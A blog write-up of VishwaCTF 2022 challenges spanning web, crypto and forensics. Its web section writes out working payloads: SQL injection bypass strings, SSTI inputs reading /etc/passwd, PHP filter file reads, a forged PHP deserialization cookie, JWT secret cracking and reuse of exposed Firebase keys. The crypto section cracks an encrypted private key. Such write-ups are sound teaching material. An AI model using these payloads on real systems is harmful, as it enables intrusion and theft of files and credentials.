---
title: "CTF - VishwaCTF 2022"
categories: [ctf]
date: 2022-03-19
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - VishwaCTF 2022
---

# VishwaCTF CTF 2022

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/logo.png" width="50%"/>
</p>

Welcome! I've participated in this CTF with team [ISwearIGoogledIt](https://ctftime.org/team/109689), specifically with [RazviOverflow](https://razvioverflow.github.io/) and got some challenges! This CTF was begginer friendly and participated for fun. Some guessy work and some challenges that remain unsolved due to the guessy part, but overall got some new techniques, specially for Firebase pentesting.

---

Challenge index:

### Web
- [My Useless Webiste](#my-useless-webiste)
- [Hey Buddy!](#hey-buddy)
- [Stock Bot](#stock-bot)
- [Request Me FLAG](#request-me-flag)
- [Todo List](#todo-list)
- [Keep Your Secrets](#keep-your-secrets)
- [Strong Encryption](#strong-encryption)
- [Flag .Collection](#flag-collection)


### Crypto
- [John the Rocker](#john-the-rocker)
- [Tallest Header](#tallest-header)


### Forensic
- [So Forgetful!](#so-forgetful)
- [The Last Jedi](#the-last-jedi)
- [Keep the flag high](#keep-the-flag-high)
- [Epistemus](#epistemus)
- [Garfeld?](#garfeld)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---
---

# Web

## My Useless Webiste
426
Description - I made this website having simple authentication used in it. But unfortunately I forgot the credentials. Can you help me to find the correct one ??

Url - https://my-us3l355-w3b51t3.vishwactf.com/

We have the following login website:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/1_00_web.png" width="50%"/>
</p>

Using basic SQL Injection payloads we get this message:

```
Warning
: SQLite3::query(): Unable to prepare statement: 1, near "or": syntax error in
/opt/app-root/src/index.php
on line
55


Fatal error
: Uncaught Error: Call to a member function fetchArray() on bool in /opt/app-root/src/index.php:56 Stack trace: #0 {main} thrown in
/opt/app-root/src/index.php
on line
56
```

Testing for other payload got us the flag:

```
User: ' OR 1=1 --
Pass: ' OR 1=1 --
```

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/1_0_sqli.png" width="60%"/>
</p>

``` VishwaCTF{I_Kn0w_Y0u_kn0W_t1hs_4lr3ady} ```

---

## Hey Buddy!
488

Hey Buddy, Give me your name I will display your name on my website. Yes exactly, there is nothing in this website.

Url - https://h3y-buddy.vishwactf.com/

We have the following input, where once we submit, it reflects the input:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/2_00_web.png" width="60%"/>
</p>

Input a name with the request:

https://h3y-buddy.vishwactf.com/submit?name=Kash


<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/2_2_wappa.png" width="60%"/>
</p>

It's using Flash and Python, maybe an SSTI (Server Side Template Injection) in the reflected input might work. Let's start with some basic payloads:

```
https://h3y-buddy.vishwactf.com/submit?name={{7*7}}
```

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/2_3_ssti.png" width="90%"/>
</p>

Now that we know it works, let's level up the payloads until we reach the flag. You can get a great reference for SSTI payloads in different template engines on [Hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-read-remote-file). In this case, we used **get_flashed_messages** a built-in function on flask

```
https://h3y-buddy.vishwactf.com/submit?name={{request.__class__}}
https://h3y-buddy.vishwactf.com/submit?name={{request.__class__.__mro__[2]}}
https://h3y-buddy.vishwactf.com/submit?name={{request.__class__.__mro__[2].__subclasses__()}}
https://h3y-buddy.vishwactf.com/submit?name={{get_flashed_messages.__globals__.__builtins__}}
```

```json
{
    "__name__": "builtins", 
    "__doc__": "Built-in functions, exceptions, and other objects...",
    "NameError": <class "NameError">,
    "UnboundLocalError": <class "UnboundLocalError">,
    "open": <built-in function open>,
    "quit": "Use quit() or Ctrl-D (i.e. EOF) to exit"
}
```

So we can use the **open** built-in object to open a file. We can access it through the **open** key in the \_\_builtins\_\_ dictionary:

```
https://h3y-buddy.vishwactf.com/submit?name={{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}
```

The flag was in the same directory, but you can use other built-in functions to obtain RCE and list the directory, but guess work made out path easier this time:

```
https://h3y-buddy.vishwactf.com/submit?name={{get_flashed_messages.__globals__.__builtins__.open("./flag.txt").read()}}
```

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/2_0_ssti.png" width="80%"/>
</p>

``` VishwaCTF{S3rv3r_1s_4fraiD_of_inj3c7ion} ```


## Stock Bot
470

We have our online shop of computer related accessories. So for easy customer interaction we have made a stock bot which will give you how many units of enlisted products are available. https://st0ck-b0t.vishwactf.com/

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/3_0_.png" width="60%"/>
</p>

We have the following source code in the website:

```js
// Hint: Along with other products the Flag is also available in the Products directory
    function sendMsg() {
        var msg = document.querySelector('#input-msg').value;
        document.querySelector('#input-msg').value = "";
        div = document.querySelector('.chat-body');
        div.innerHTML += "<div id='user-chat' class='user-div'><p class='user-msg msg'>" + msg + "</p></div>";
        div.scrollTop = div.scrollHeight;
        if(!msg.includes('Flag')){
            async function fetchDataAsync(url) {
            try {
                const response = await fetch(url);
                obj = (await response.json());
                div.innerHTML += "<div class='bot-div'><img src='bot.png' class='bot-avatar' /><p class='bot-msg msg'>"+obj['Quantity']+"</p></div>"
            } catch (error) {
                div.innerHTML += "<div class='bot-div'><img src='bot.png' class='bot-avatar' /><p class='bot-msg msg'>No such product</p></div>"  
            }
                div.scrollTop = div.scrollHeight;
            }
            fetchDataAsync('/Products/check.php?product='+msg);
        }
        else{
            div.innerHTML += "<div class='bot-div'><img src='bot.png' class='bot-avatar' /><p class='bot-msg msg'>No such product</p></div>"  
            div.scrollTop = div.scrollHeight;
        }
    }
```

The interesting part is on the **fetchDataAsync('/Products/check.php?product='+msg);** line, were we can see that it checks for the product with the direct input of the user with no sanitization. Testing for different payloads we could see this error message coming from the server:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/3_2_check.png" width="80%"/>
</p>


So we tried PHP filters and extracted the source code:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/3_3_expect.png" width="80%"/>
</p>

```
/Products/check.php?product=php://filter/convert.base64-encode/resource=check.php
```

```json
{"Quantity":"PD9waHAgCgogICAgaWYoaXNzZXQoJF9HRVRbJ3Byb2R1Y3QnXSkpewogICAgICAgICRwcm9kdWN0ID0gJF9HRVRbJ3Byb2R1Y3QnXTsKICAgICAgICBoZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbicpOwogICAgICAgIGlmKHN0cnBvcygkcHJvZHVjdCwnRmxhZycpKXsKICAgICAgICAgICAgJGRhdGEgPSBhcnJheSgnRmxhZycgPT4gZmlsZV9nZXRfY29udGVudHMoJHByb2R1Y3QpKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgJGRhdGEgPSBhcnJheSgnUXVhbnRpdHknID0+IGZpbGVfZ2V0X2NvbnRlbnRzKCRwcm9kdWN0KSk7CiAgICAgICAgfQogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJGRhdGEpOwogICAgfQoKPz4="}
```

Decode it from base64...

```php
<?php 

    if(isset($_GET['product'])){
        $product = $_GET['product'];
        header('Content-type: application/json');
        if(strpos($product,'Flag')){
            $data = array('Flag' => file_get_contents($product));
        }
        else{
            $data = array('Quantity' => file_get_contents($product));
        }
        echo json_encode($data);
    }

?>
```

So the input that we need is Flag:
url: /Products/check.php?product=Flag

```json
{"Quantity":"VishwaCTF{b0T_kn0w5_7h3_s3cr3t}"}
```

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/3_3_flag.png" width="70%"/>
</p>

``` VishwaCTF{b0T_kn0w5_7h3_s3cr3t} ```

---

## Request Me FLAG
499

Somebody hosted this website having flag in it. Just request the FLAG to them maybe they will give you. https://r3qu35t-m3-fl4g.vishwactf.com/

We have the following website:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/4_0_web.png" width="70%"/>
</p>

With that challenge description we might wan't to call other request method called FLAG(?) maybe... So instead of GET/POST use FLAG method:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/4_1_flag.png" width="70%"/>
</p>

``` VishwaCTF{404_1s_ju57_4n_i11u5ion} ```

---

## Todo List
500

Simple Todo list website to manage your tasks. Use it wisely. https://t0-d0-l1st.vishwactf.com/

We have the following website where you can add tasks:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/5_0_web.png" width="70%"/>
</p>

We can review the source code with the right bottom button:

```php
 <?php

Class ShowSource{
    public function __toString()
    {
        return highlight_file($this->source, true);
    }
}

if(isset($_GET['source'])){
    $s = new ShowSource();
    $s->source = __FILE__;
    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 40);
    $m = substr($c, 40);
    if(sha1($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];
    $todos[] = $todo;
    $m = serialize($todos);
    $h = sha1($m);
    setcookie('todos', $h.$m);
    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}
?>

```

So the website is using the cookie to store the tasks. It is using the **unserialize()** function, which is well know to be vulnerable is not used properly as described in the [documentation](https://www.php.net/manual/en/function.unserialize.php). In this case, the input it's not sanitized, therefore we can input our payload directly into the unserialize function and exploit this vulnerability.

This is the cookie when we stored two "flag" tasks:

```
todos=952a7d7c0da6c6a43087fa4e7ddd256efad8c1d7a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22flag%22%3Bi%3A1%3Bs%3A4%3A%22flag%22%3B%7D

URL decode

952a7d7c0da6c6a43087fa4e7ddd256efad8c1d7a:2:{i:0;s:4:"flag";i:1;s:4:"flag";}

SHA1: 952a7d7c0da6c6a43087fa4e7ddd256efad8c1d7
Serialized object: a:2:{i:0;s:4:"flag";i:1;s:4:"flag";} These are the parts:

```

What is the meaning of the serialized object? Let's decompose it:

```js
a:2:{i:0;s:4:"flag";i:1;s:4:"flag";}

// a:2:{}
//      An array of 2 items
// i:0;s:4:"flag"; 
//    i:0;
//      Integer, value 0 (index)
//    s:4;
//      String, length 4
//    "flag";
//      The string itself
//  ...
```

Great, we have seen how an array is serialized in PHP and the meaning of the different parts. How can we take advantage from these?
We can also serialize objects, data structures, types and classes. How can we access the _/flag.php_ file (we know from the hint in the src code)?
We obtained the code of this file with the __Class ShowSource__ as we saw in the source code, so applying it to the _/flag.php_ might be feasible. Let's see what we need and the corresponding payload.

1. We need to call the **__toString()** method from the ShowSource class, so we need to echo it or print it in the HTML. We can do it by inserting it in the TODO list array.

```js
a:1:{something}
```

We need to instanciate an object of class ShowSource with the source attribute "flag.php". We can achieve it with the following payload: 

```js
O:16:"ShowSource":1:{s:6:"source";s:8:"flag.php";}
```

(If you are not confident with the payload crafting, you can always write your payload in PHP, serialize it and print it)

So the final payload is this:

```js
a:1:{i:0;O:16:"ShowSource":1:{s:6:"source";s:8:"flag.php";}}
```

Let's use PHP to craft it and to obtain the SHA1 from that string:


```php
$foo = new ShowSource();
$foo->source = 'flag.php';

$bar = [];
$bar[] = $foo;

$m = serialize($bar);
$h = sha1($m);

echo urlencode($h.$m);
```

Final payload:

```
db2a103dd4cc5d8271a28152d8f3de49379d9ad8a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22ShowSource%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D 
```

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/5_2_flag.png" width="70%"/>
</p>

``` VishwaCTF{t7e_f1a6_1s_1is73d} ```

---

## Keep Your Secrets
490

Yet another API for ‘user’ signup and login. You know the drill, GO! https://k33p-y0ur-53cr3t5.vishwactf.com/

We have the following website listing the different API methods:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_0_web.png" width="70%"/>
</p>

Calling the singup we obtain a JWT token:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_11_req.png" width="70%"/>
</p>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQ3ODkwODM5fQ.3f-DyDHTGTGR3ENVQuUKxPV0hRoS2Ix0dSaFQqolqdQ
```

And using it on the user endpoint we see the unauthorized message:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_2_invalid_admin.png" width="70%"/>
</p>

We can check the content using [JWT.io](https://jwt.io/)

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_2_jwt.png" width="70%"/>
</p>

The first possibility is to change the **role** from user to admin and probably we might gain access. The problem to this approach is that we need to sign the token with a secret key (the blue/last part of the token). We don't the key, but what if the key is weak and can be guessable? Let's try to crack it using [jwt_tool](https://github.com/ticarpi/jwt_tool) and the **rockyou.txt** wordlist which holds a great set of common passwords:

```sh
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQ3ODkwODM5fQ.3f-DyDHTGTGR3ENVQuUKxPV0hRoS2Ix0dSaFQqolqdQ
```

Soooooooo I didn't get this challenge becase I didn't have the secret on the wordlist. The key was _owasp_. Since I supposed that bruteforcing tasks on CTF are not further than rockyou.txt or some basic hashcat commands I abandoned this task. Once I knew the key, attack is simple:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_3_jwt.png" width="70%"/>
</p>

Once we know the secret, we can change the role and sign the token with that algorithm:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_4_tamper.png" width="70%"/>
</p>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY0Nzg5MDgzOX0.Uu8-VyS9gN2I6ux06hH41UDpmF82nC_g18lUfPbbqNs
```

Now use the token in the request:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/6_5_flag.png" width="70%"/>
</p>

``` VishwaCTF{w3@k_$ecr3t$} ```

---

## Strong Encryption
496

This is our one of the most strong encryption algorithm. Try to decrypt the flag by tracing how it is encrypted.

Url - https://5tr0ng-3ncrypt10n.vishwactf.com/

We have the following source code:

```php
 <?php

    // Decrypt -> 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7

    $flag="";

    function encrypt($str,$enKey){

        $strHex='';
        $Key='';
        $rKey=69;
        $tmpKey='';

        for($i=0;$i<strlen($enKey);$i++){
            $Key.=ord($enKey[$i])+$rKey;
            $tmpKey.=chr(ord($enKey[$i])+$rKey);
        }    

        $rKeyHex=dechex($rKey);

        $enKeyHash = hash('sha256',$tmpKey);

        for ($i=0,$j=0; $i < strlen($str); $i++,$j++){
            if($j==strlen($Key)){
                $j=0;
            }
            $strHex .= dechex(ord($str[$i])+$Key[$j]);
        }
        $encTxt = $strHex.$rKeyHex.$enKeyHash;
        return $encTxt;
    }

    $encTxt = encrypt($flag, "VishwaCTF");

    echo $encTxt;

?> 
```

So more than web this is a reversing challenge. Therefore I reverse it (in Python3, I just hate PHP):

```python
strkey = '576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982'
key = '155174184173188166136153139'
chars = [strkey[i:i+2] for i in range(0, len(strkey), 2)]
counter = 0
flag = []

for char in chars:

    if counter == len(key):
        counter = 0

    i = int(char, 16)
    flag.append(chr(i-int(key[counter])))
    counter += 1

print(''.join(flag))
```

Executing the reversed algorithm we obtained the flag:

``` VishwaCTF{y0u_h4v3_4n_0p_m1nd} ```

---

## Flag .Collection
488

We are collecting cool flag names for our next CTF, please suggest us some cool names and we’ll store them in our database for our next CTF. https://fl4g-c0ll3ct10n.vishwactf.com/

We have the following website and source code within it:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/7_0_web.png" width="70%"/>
</p>

```js
const _0x57df30 = _0x3fb9;
function _0x3fb9(_0x29beda, _0x336439) {
    const _0x3451ef = _0x3451();
    return (
        (_0x3fb9 = function (_0x3fb963, _0x508455) {
        _0x3fb963 = _0x3fb963 - 0x10e;
        let _0x5d23ef = _0x3451ef[_0x3fb963];
        return _0x5d23ef;
        }),
        _0x3fb9(_0x29beda, _0x336439)
    );
}
(function (_0x417ff4, _0x43e4ef) {
const _0x927f6f = _0x3fb9,
  _0x359498 = _0x417ff4();
while (!![]) {
  try {
    const _0x54d75f =
      (parseInt(_0x927f6f(0x11a)) / 0x1) *
        (parseInt(_0x927f6f(0x111)) / 0x2) +
      (-parseInt(_0x927f6f(0x11e)) / 0x3) *
        (-parseInt(_0x927f6f(0x11b)) / 0x4) +
      -parseInt(_0x927f6f(0x10e)) / 0x5 +
      (-parseInt(_0x927f6f(0x119)) / 0x6) *
        (-parseInt(_0x927f6f(0x110)) / 0x7) +
      (parseInt(_0x927f6f(0x113)) / 0x8) *
        (parseInt(_0x927f6f(0x116)) / 0x9) +
      -parseInt(_0x927f6f(0x115)) / 0xa +
      (parseInt(_0x927f6f(0x10f)) / 0xb) *
        (-parseInt(_0x927f6f(0x114)) / 0xc);
    if (_0x54d75f === _0x43e4ef) break;
    else _0x359498["push"](_0x359498["shift"]());
  } catch (_0x709faf) {
    _0x359498["push"](_0x359498["shift"]());
  }
}
})(_0x3451, 0xc0e6c);
function _0x3451() {
const _0x57f996 = [
  "259962gFuKEn",
  "1110672IRjTeV",
  "12GyewIN",
  "vishwa-ctf",
  "AIzaSyA0c3Mh8DCVlEtX5vi29dgpB-Z-l_BdhEg",
  "1408335oCFCQd",
  "6902455ERMZai",
  "8657ogwkbH",
  "147vXZWWD",
  "2OmcftW",
  "1085755885984",
  "8OISBQk",
  "6228pslsvW",
  "14548710LcHATF",
  "5445585bALQCb",
  "vishwa-ctf.appspot.com",
  "https://vishwa-ctf-default-rtdb.firebaseio.com",
];
_0x3451 = function () {
  return _0x57f996;
};
return _0x3451();
}
const firebaseConfig = {
    apiKey: "AIzaSyCOrohCmYL_hq5DaqFbQM3rxHXT0pNE6SA",
    authDomain: "vishwa-ctf-challenge-12.firebaseapp.com",
    projectId: "vishwa-ctf-challenge-12",
    storageBucket: "vishwa-ctf-challenge-12.appspot.com",
    messagingSenderId: "125452069157",
    appId: "1:125452069157:web:2d20b318f3e448ebfa52cc",
}; 
```

We can see in it a Firebase 🔥 database configuration with the API key and everything. Having all that, we can use it to see the flags that the application is storing in it. I searched for many tools or URL formats to access these data, and ended up with [baserunner](https://github.com/iosiro/baserunner). If you have issues while building the npm module, use _export NODE_OPTIONS=--openssl-legacy-provider_. Let's wrap up the configuration for this Firebase:


```json
{
  "apiKey": "AIzaSyA0c3Mh8DCVlEtX5vi29dgpB-Z-l_BdhEg",
  "authDomain": "vishwa-ctf-challenge-12.firebaseapp.com",
  "databaseURL": "https://PROJECT_ID.firebaseio.com",
  "projectId": "vishwa-ctf-challenge-12",
  "storageBucket": "vishwa-ctf-challenge-12.appspot.com",
  "messagingSenderId": "125452069157",
  "appId": "1:125452069157:web:2d20b318f3e448ebfa52cc",
  "databaseURL": "https://vishwa-ctf-default-rtdb.firebaseio.com"
}
```

Set the configuration in the web interface for this module:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/7_1_setup.png" width="70%"/>
</p>

In this case, we want to check the collection **flag** which might hold all the flags:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Web/7_2_flag.png" width="70%"/>
</p>

``` vishwactf{c0nfigur3_y0ur_fir3b@s3_rule$} ```


Other easier [solution](http://o_o.jseung.me/ctf/2020/vishwactf/#flag-collection) worth noting. With the following URL we can access all the previous data:

```
https://firestore.googleapis.com/v1/projects/vishwa-challenge-12/databases/(default)/documents/flag
```

---
---

# Crypto

## John the Rocker
412 

They gave us the following private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,115D424076ADCE7E40ACC1E44E4E791A
 
flkT1+aCoQZ4YBHg2VRW3x4HzlEKFwqQ+ePMzEi2BIREHXDtHR1+QUrYRSQLzP4E
jDSkmPWPoTvTXRAyXKrQL8FzkvYDcP9hjkzt41tjsRHz2nkI9K+WFm8DNi6qVS9H
J/yWZdvUED6XwwxTFe6D01GwU7yc7xheE4GlIBazk68Q0tNuH34H8T+hnfkTyNA6
BJL861zNhZNIoWm/352vYydnT/HynugCGn+TIu88C+tLBpcLdLSh50OgTiZ8QK2A
Z82PoPfD1ziVmg7E4BIY1/1qJnNxCMTzUG4PbjLpdkRxHu5aOGzbGZK4K0inDNfr
B7ZedUOCSUTN0VGl5/spDO506vSOjzGL9/iDhYNBRvn4hW3VlPE6nRXAQ78r4Z49
ou0r2x7WvzrpFOPXjvlNHUFyWF9x5ZWsqNnr3PFL2wlCVvGq2z/mWvFdmy0tr6nV
FjEpOwrKMt0hvTcCwry8FKAyPDFafpZq4fg90Jd9xCYWJIZMxuEPOY0jfcSC7QOy
woOhMMCFA3mbJJWOAOKynZdx/7fe/0+Q0XMlljDNXNGNqKRqS9OUhKH967FYxw4W
AQHrN2NdT5WoXJhbDu67Z2jb89LAFR+uBlaxauLSYEFatKmAp/IXR4yTX4yn6Ur2
mlrJ6abOjmi+/LcvMN+qCx7pB//MR2HUxcOWdgA5nuXiYBdiSKj8h0Sq3IVVjDFd
Oj1t0D9m6AUsV32qbiXwiiCkOOMHVZH+6sc1ZMKNwR1WGvFBNyR0DVxlXAzyR7zP
nRUXCLihj696lm+Ywe6xsDOPJMl4RHOAvf+cj3fkI3WKhfhTUhoLrEZmIFDNhKrn
JCe4m9p+aNuPSuXL07bxKbYT6D4wlVE4OlkwZyAfc5R/cfE5JYFgwoIW5RJC9nh1
ru/aBj+464986pteEfI0e3nAuDquEvs37Oxv77n/AdW7QmySIb7RrpUfOCcq+rBt
4zg1cS5i2TX1l25h036E45Rn+efM9QBKQEChhgqfLZ9rbQqqm1coOok4sZZ1tWap
7352duKI9fzMq35P9u4T168sYSvZoa2hK7eZZ3KA/MK8u6B1yFiB1E2rEZGnVeOU
KLt1IFxygxZl9yO5yb4pa8tl6yKO46+OYmCe9ie7FkOEeq85a0xm0OB3HVxL/40/
116u2fJCRoDBjNZ1J4ujYwYUpWEfVoN26KRRiyRMJbHX9QwuW6k+b1OjLgjU2IaR
4BgG6xBTmM3fRQZhWbJ+06ibWDcIRdZOP02iksp/LdJtqtuYIWf2epUx3oBMrSN/
bFDUmLDzfSUCvz4MdZNp8FE1ElM2NK9PWYPe3XA5lzjkl9jxWD7M4WKLTjQJu9P0
PB4x+nHPj5j6XONZ74IbM1f7S4oRuhBCs5hPMgxDr7xSa0ROFsTauCeQ6N22JwIk
GzMpmzBzJtL5/SzFCuN148sMUOASnXLSYd79dB15M0nVRo6Iz9mytF/QVuci+8h+
6luGQBgih+L5ghx1qvUXwNyU+Id9fZYRA8pH2hy5pPWVsaws/1cLOc5PBzOaql7G
90iM4IyzSN2AO8/6HnSJ9tZSCG5cdRq+r1ROF30QnvnUowsbq0eeT4TVfb+kCaHx
-----END RSA PRIVATE KEY-----
```

So, by the name of the challenge, john (tool) and rockyou.txt (wordlist) came to my mind, so let's crack the private key with those:

```sh
python3 /usr/share/john/ssh2john.py idrsa.id_rsa.docx > id_rsa.hash

john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!**john**!!     (idrsa.id_rsa.docx)     
1g 0:00:00:03 DONE (2022-03-19 12:57) 0.2557g/s 3667Kp/s 3667Kc/s 3667KC/s !!..katie..!!123..!!""=&
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

So the flag is the key:

``` VishwaCTF{!!**john**!!} ```

---

## Tallest Header
332

My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase.

They provide us a corrupted file called _file.extension_. Let's see the header of the file:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Crypto/2_0_xxd.png" width="70%"/>
</p>

That Exif string is a header usually present on JPEG images, so let's fix the first bytes of the image and let's see if that fix the image. I used hexedit and the file header for JPEG (you can find it on [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)):

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Crypto/2_1_hex.png" width="70%"/>
</p>

Fix header with **FF D8 FF DB** 

Then we can see the image from el bicho:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Crypto/file.jpeg" width="70%"/>
</p>

Now we have to dig deep. I use binwalk to check if there is something else in the image:

```sh
binwalk -M --dd=.* file.extension
```
<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Crypto/2_3_zip.png" width="70%"/>
</p>

We can see a zip file, and within, there is a Python3 script called _encrypt.py_ and a _info.txt_ text file:

encript.py:

```python

def encrypt(key, plaintext):

    plaintext = "".join(plaintext.split(" ")).upper()
    ciphertext = ""

    for pad in range(0, len(plaintext) % len(key) * -1 % len(key)):
        plaintext += "X"

    for offset in range(0, len(plaintext), len(key)):
        print(f'Cypher {ciphertext}')
        for element in [a - 1 for a in key]:
            ciphertext += plaintext[offset + element]
            print(f'offset {offset}, element {element}')
        ciphertext += " "

    return ciphertext[:-1]

```

info.txt:

```
key = [2,1,3,5,4]

ciphertext = RT1KC _YH43 3DRW_ T1HP_ R3M7U TA1N0
```

Reversing the script I could decript the ciphertext:

```python

def decrypt(key, ciphertext):

    final = []
    for piece in ciphertext:
        res = ''
        for pos in key:
            pos = pos - 1
            res += piece[pos]
        final.append(res)
    print(''.join(final).lower())

key = [2,1,3,5,4]

ciphertext = ["RT1KC","_YH43","3DRW_","T1HP_","R3M7U","TA1N0"]

decrypt(key, ciphertext)

```

And we obtain the flag (in lower case, as stated in the description)

``` VishwaCTF{tr1cky_h34d3r_w1th_p3rmu7at10n} ```

---
---


# Forensic


## So Forgetful!
250

Once my friend was connected to my network, he did some office work and left. Next day he called me that he forgot his password, and wanted me to rescue him <3

On the pcap file in the challenge, we can see a form data in clear text with the password:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/1_0_password.png" width="70%"/>
</p>

Form item: "pswrd" = "S04xWjZQWFZ5OQ=="

Decoded in base64 is _KN1Z6PXVy9_ (the password) so the flag is:

``` VishwaCTF{KN1Z6PXVy9} ```

---

## The Last Jedi
301

What it takes do you have?

We got an image:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/Y0D4.jpg" width="50%"/>
</p>

```sh
binwalk -M --dd=.* Y0D4.jpg         

Scan Time:     2022-03-19 11:06:45
Target File:   /home/kali/Desktop/CTFs/VishwaCTF2022/Forensic/Y0D4.jpg
MD5 Checksum:  3b790bbfc43c84f4a26814d5ec7b1ddb
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
369525        0x5A375         RAR archive data, version 5.x
```

Within the RAR file there was two other images, one of them had the flag on the string:

```sh
strings Is_This_Really_It.jpg
```

flag:{H1DD3N_M34N1NG}

``` VishwaCTF{H1DD3N_M34N1NG} ```

---

## Keep the flag high
488

The great Pirate Narao Gosco has your flag but pirates are hard to fight. Can you rotate the ch4n7es in your favor?

We got a corrupted bpm file (bitmap). Which seems to be corrupted.

I used PCRT to try fixing it:

```sh
python2 /home/kali/Tools/PCRT/PCRT.py -i sail_the_ship.bmp -o fixed.png
```

We got a QR:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/fixed.png" width="40%"/>
</p>

Reading the QR we obtained the following URL where we can download an image:
[https://drive.google.com/drive/folders/1gpcc6253bQ_-DZKjKYjGcBo0Y_w01iiB](https://drive.google.com/drive/folders/1gpcc6253bQ_-DZKjKYjGcBo0Y_w01iiB)

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/pirate.jpeg" width="50%"/>
</p>

strings pirate.jpeg

At the end of the file RazviOverflow found this string:

NDF_:5bE0D:0d4:D?bC_7Lu%r2H9D:'

As suggested by the challenge description, used ROT47 to obtain the flag:

}su0id3t_si_5cisn3r0f{FTCawhsiV

``` VishwaCTF{f0r3nsic5_is_t3di0us} ```

---

## Epistemus
490

This image goes hard, feel free to run diagnostics.

We got this image:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/patrik.jpg" width="50%"/>
</p>

After trying many different tools like binwalk, exiftool, etc... I went to [Aperisolve](https://aperisolve.fr/40d6244ac8d93e0dcc247946cf0f2185) and check the images. You can also do this locally with [Stegoveritas](https://github.com/bannsec/stegoVeritas):

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_aperi.png" width="50%"/>
</p>

On the image we found the following string:

[https://github.com/RohitStark/Epistemus](https://github.com/RohitStark/Epistemus)

This repo contains some files and this description:

README.md

```
Epistemus
Is this even relevant?
Arire tbaan tvir lbh hc Arire tbaan yrg lbh qbja Arire tbaan eha nebhaq naq qrfreg lbh Arire tbaan znxr lbh pel Arire tbaan fnl tbbqolr Arire tbaan gryy n yvr naq uheg lbh
```

After ROT13 decode:

```
Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you
```

